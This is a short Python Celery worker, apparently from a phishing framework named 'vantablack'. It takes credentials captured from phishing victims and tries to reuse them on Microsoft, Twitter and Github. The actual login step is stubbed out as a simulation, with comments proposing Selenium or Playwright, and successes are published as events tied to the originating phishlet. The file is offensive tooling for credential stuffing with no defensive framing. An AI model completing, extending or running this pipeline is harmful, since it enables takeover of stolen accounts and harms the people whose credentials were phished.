from core.event_bus import app, publish_event
import logging

logger = logging.getLogger("CredentialReuseWorker")

# Liste des services sur lesquels tenter la réutilisation.
# Dans une vraie version, cela serait beaucoup plus complexe, avec des stratégies par service.
TARGET_SERVICES = ["Microsoft", "Twitter", "Github"]

@app.task(name='vantablack.events.credential_captured')
def attempt_credential_reuse(data: dict):
    """
    Handles the 'credential_captured' event and attempts to reuse the credentials on other platforms.
    """
    captured_data = data.get('captured_data', {})
    username = captured_data.get('username') or captured_data.get('email')
    password = captured_data.get('password')

    if not username or not password:
        return

    logger.info(f"[REUSE_WORKER] Received credentials for user '{username}'. Attempting reuse on other services...")

    for service in TARGET_SERVICES:
        logger.info(f"[REUSE_WORKER] ---> Simulating login attempt on {service} for user '{username}'")
        
        # Ici, on implémenterait la logique de connexion pour chaque service.
        # Par exemple, en utilisant une bibliothèque comme Selenium ou Playwright pour simuler une connexion navigateur.
        # success = attempt_login(service, username, password)
        success = False # Simulation

        if success:
            log_msg = f"[REUSE_WORKER] SUCCESS! Credentials for '{username}' are valid on {service}!"
            logger.warning(log_msg)
            publish_event('credential_reuse_success', {
                "username": username,
                "service": service,
                "original_phishlet": data.get('phishlet_name')
            })
        else:
            logger.info(f"[REUSE_WORKER] Failure. Credentials for '{username}' are not valid on {service}.")

# To run this worker:
# celery -A workers.credential_reuse_worker worker --loglevel=info
